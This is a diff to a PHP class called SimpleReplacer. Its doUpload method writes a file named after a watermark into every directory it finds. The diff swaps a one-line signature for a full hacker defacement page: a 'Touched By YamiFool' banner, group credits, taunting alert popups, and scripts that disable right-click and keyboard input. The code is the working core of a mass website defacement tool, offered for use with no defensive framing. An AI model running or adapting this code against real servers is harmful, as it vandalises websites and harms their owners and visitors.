@@ -114,13 +114,205 @@ class SimpleReplacer {
         ];
     }
 
-    private function doUpload() {
-        $dirs = $this->findDirs();
-        $count = 0;
-        $list = [];
+private function doUpload() {
+    $dirs = $this->findDirs();
+    $count = 0;
+    $list = [];
 
-        $fileName = $this->watermark . ".php"; 
-        $fileContent = "Touched By YamiFool - JesterFool - Godfathers77 - L4NA - All Royal Fool ' . $this->watermark . ' SeniDariKesedihan";
+    $fileName = $this->watermark . ".php"; 
+    $fileContent = '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<meta name="viewport" content="width=device-width, initial-scale=1" /> 
+<head>
+    <title>Touched By YamiFool - Royal Fool</title>
+<meta property="og:description" content="Touched By YamiFool - Royal Fool!!"/>	
+<meta property="og:image" content="https://i.ibb.co.com/sd4ZB5Xp/image.png"/>
+<link rel="shortcut icon" href="https://i.ibb.co.com/sd4ZB5Xp/image.png"/>
+<link href="https://fonts.googleapis.com/css?family=&display=swap" type="text/css" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Audiowide&display=swap" type="text/css" rel="stylesheet">
+</head>
+<body oncontextmenu="return false" onkeydown="return false" onmousedown="return false">
+<script type="text/javascript">
+var snowmax=35;
+var snowcolor=new Array("#AAAACC","#DDDDFF","#CCCCDD","#F3F3F3","#F0FFFF");
+var snowtype=new Array("Arial Black","Arial Narrow","Times","Comic Sans MS");
+var snowletter="*";
+var sinkspeed=0.6;
+var snowmaxsize=22;
+var snowminsize=8;
+var snowingzone=1;
+var snow=new Array();
+var marginbottom;
+var marginright;
+var timer;
+var i_snow=0;
+var x_mv=new Array();
+var crds=new Array();
+var lftrght=new Array();
+var browserinfos=navigator.userAgent;
+var ie5=document.all&&document.getElementById&&!browserinfos.match(/Opera/);
+var ns6=document.getElementById&&!document.all;
+var opera=browserinfos.match(/Opera/);
+var browserok=ie5||ns6||opera;
+
+function randommaker(range) {		
+    rand=Math.floor(range*Math.random());
+    return rand;
+}
+
+function initsnow() {
+    if (ie5 || opera) {
+        marginbottom = document.body.clientHeight;
+        marginright = document.body.clientWidth;
+    } else if (ns6) {
+        marginbottom = window.innerHeight;
+        marginright = window.innerWidth;
+    }
+    var snowsizerange = snowmaxsize - snowminsize;
+    for (i=0; i<=snowmax; i++) {
+        crds[i] = 0;                      
+        lftrght[i] = Math.random()*15;         
+        x_mv[i] = 0.03 + Math.random()/10;
+        snow[i]=document.getElementById("s"+i);
+        snow[i].style.fontFamily=snowtype[randommaker(snowtype.length)];
+        snow[i].size=randommaker(snowsizerange) + snowminsize;
+        snow[i].style.fontSize=snow[i].size;
+        snow[i].style.color=snowcolor[randommaker(snowcolor.length)];
+        snow[i].sink=sinkspeed * snow[i].size/5;
+        if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size);}
+        if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size);}
+        if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size) + marginright/4;}
+        if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size) + marginright/2;}
+        snow[i].posy=randommaker(2*marginbottom - marginbottom - 2*snow[i].size);
+        snow[i].style.left=snow[i].posx;
+        snow[i].style.top=snow[i].posy;
+    }
+    movesnow();
+}
+
+function movesnow() {
+    for (i=0; i<=snowmax; i++) {
+        crds[i] += x_mv[i];
+        snow[i].posy += snow[i].sink;
+        snow[i].style.left = snow[i].posx + lftrght[i]*Math.sin(crds[i]);
+        snow[i].style.top = snow[i].posy;
+        if (snow[i].posy >= marginbottom-2*snow[i].size || parseInt(snow[i].style.left) > (marginright-3*lftrght[i])) {
+            if (snowingzone==1) {snow[i].posx = randommaker(marginright-snow[i].size);}
+            if (snowingzone==2) {snow[i].posx = randommaker(marginright/2-snow[i].size);}
+            if (snowingzone==3) {snow[i].posx = randommaker(marginright/2-snow[i].size) + marginright/4;}
+            if (snowingzone==4) {snow[i].posx = randommaker(marginright/2-snow[i].size) + marginright/2;}
+            snow[i].posy = 0;
+        }
+    }
+    timer = setTimeout("movesnow()", 50);
+}
+
+for (i=0; i<=snowmax; i++) {
+    document.write("<span id=\'s" + i + "\' style=\'position:absolute;top:-" + snowmaxsize + "\'>" + snowletter + "</span>");
+}
+if (browserok) {
+    window.onload = initsnow;
+}
+</script>
+<style type="text/css">
+.lagu{background:transparent;border:1px solid red;font-family:Share Tech Mono;color:;font-size:10px;font-weight:normal;padding:2px 25px;text-decoration:none;text-shadow:0 0 0px #15cff4;}
+img[alt="www.000webhost.com"]{display:none;}
+HTML, BODY{cursor: none;}
+body{
+    background-image: url(https://i.ibb.co/SKCF8yR/f0c931fc26fcfa7ae10f869d4be9027c-w200.gif);
+    background-size: cover;
+    background-repeat: no-repeat;
+    background-position: center;
+    background-attachment: fixed;
+    height: 100%;
+}
+.title{
+    text-align: center;
+    font-size: 2.5em;
+    color: #000;
+}
+h1 {
+    text-align: center;
+    color: #3335cf;
+    font-size: 35px;
+    font-family: Arial Narrow, sans-serif;
+    font-style: garamond;
+    text-shadow: 0px 0px 0px #f00505;
+}
+</style>
+<script>
+function play(){var audio=document.getElementById(\'lagu\');audio.play();}
+function liat(){document.getElementById(\'galiat\').style.visibility=\'visible\';}
+</script>
+<script src="../cdn.rawgit.com/bungfrangki/efeksalju/2a7805c7/efek-salju.js" type="text/javascript"></script>
+<body BGCOLOR="none">
+<center>
+<body background="index.html" height="" width="">
+<center>
+    <center>
+	  </br> </br> </br>
+<script>alert("Aku Tak Bisa Melupakanku !!");</script>
+<script>alert("Im loser !!");</script>
+<script>alert("Yami Pecundang:)");</script>
+<center>
+		  </br> </br> </br> </br> </br> </br>
+		  <center>
+			  <img src="https://i.ibb.co.com/yF1SS04p/download.gif"/>
+		  </center>
+          <br><br><br>
+<i>
+<script language="JavaScript1.2">
+var message="TOUCHED BY ./YamiFool";
+var neonbasecolor="red";
+var neontextcolor="white";
+var flashspeed=100;
+var n=0;
+
+if (document.all||document.getElementById){
+    document.write(\'<font color="\'+neonbasecolor+\'">\');
+    for (m=0; m<message.length; m++)
+        document.write(\'<span id="neonlight\'+m+\'">\'+message.charAt(m)+\'</span>\');
+    document.write(\'</font>\');
+} else {
+    document.write(message);
+}
+
+function crossref(number){
+    var crossobj = document.all ? document.all["neonlight"+number] : document.getElementById("neonlight"+number);
+    return crossobj;
+}
+
+function neon(){
+    if (n==0){
+        for (m=0; m<message.length; m++)
+            crossref(m).style.color = neonbasecolor;
+    }
+    crossref(n).style.color = neontextcolor;
+    if (n < message.length-1) {
+        n++;
+    } else {
+        n = 0;
+        clearInterval(flashing);
+        setTimeout("beginneon()", 2000);
+        return;
+    }
+}
+
+function beginneon(){
+    if (document.all||document.getElementById)
+        flashing = setInterval("neon()", flashspeed);
+}
+beginneon();
+</script>
+</h2>
+</body>
+</br>
+</br><b><font color=white size=3 face="courier New"> "Selamat Berbahagia Dengan Pasanganmu:)" </font> </b> </br>
+</br><b><font color=red size=2 face="courier New"> Thanks to: </font> </b> </br> 
+<b><font color=white size=1 face="courier New"> - Royal Fool - JasterFool - GodFather77 - L4NA - YamiFool </font></b>
+</br> </br>
+<i><font color=grey size=1 face="courier New"> Copyright@since2018 </font> </i>
+';
 
         foreach ($dirs as $dir) {
             $targetPath = $dir . '/' . $fileName;
